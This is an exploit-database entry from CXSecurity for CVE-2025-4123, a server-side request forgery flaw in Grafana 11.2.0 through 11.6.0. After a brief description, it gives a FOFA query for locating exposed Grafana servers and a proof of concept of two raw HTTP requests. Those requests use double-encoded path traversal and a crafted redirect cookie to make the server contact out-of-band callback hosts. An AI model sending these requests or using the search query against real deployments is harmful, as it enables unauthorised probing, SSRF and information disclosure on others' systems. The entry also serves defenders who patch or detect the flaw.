---
title: Grafana 11.6.0 SSRF
url: https://cxsecurity.com/issue/WLB-2026040006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-09
fetch_date: 2026-04-10T04:44:44.306766
---

# Grafana 11.6.0 SSRF

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Grafana 11.6.0 SSRF** **2026.04.09**  Credit:  **[Beatriz Fresno Naumova](https://cxsecurity.com/author/Beatriz%2BFresno%2BNaumova/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-4123](https://cxsecurity.com/cveshow/CVE-2025-4123/ "Click to see CVE-2025-4123")**  CWE: **N/A** | |

# Exploit Title: Grafana 11.6.0 - SSRF
# FOFA: app="Grafana"
# Date: 2-11-2025
# Exploit Author: Beatriz Fresno Naumova
# Vendor Homepage: https://grafana.com/
# Software Link: https://grafana.com/grafana/download
# Version: 11.2.0 - 11.6.0
# CVE: CVE-2025-4123
Description:
An SSRF (Server-Side Request Forgery) vulnerability exists in Grafana's `render/public` (and related public rendering) endpoints owing to a combination of client-side path traversal encoding and an open redirect. Under certain configurations — especially when anonymous access or vulnerable plugins (e.g., Image Renderer) are enabled — an attacker can cause the server to perform requests to attacker-controlled hosts or induce redirections that lead to SSRF and subsequent information disclosure.
POC:
GET /render/public/..%252f%255Cczeqm5.dnslog.cn%252f%253F%252f..%252f.. HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Fedora; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0
Connection: close
Accept-Encoding: gzip
GET /public/..%2F%5c123.czeqm5.dnslog.cn%2F%3f%2F..%2F.. HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12) AppleWebKit/616.19 (KHTML, like Gecko) Version/17.7.17 Safari/616.19
Connection: close
Cookie: redirect\_to=%2Frender%2Fpublic%2F..%25252f%25255Cd0nt31pu8bl7cn5ncca08sg68smps8h39.oast.live%25252f%25253F%25252f..%25252f..
Accept-Encoding: gzip

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026040006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top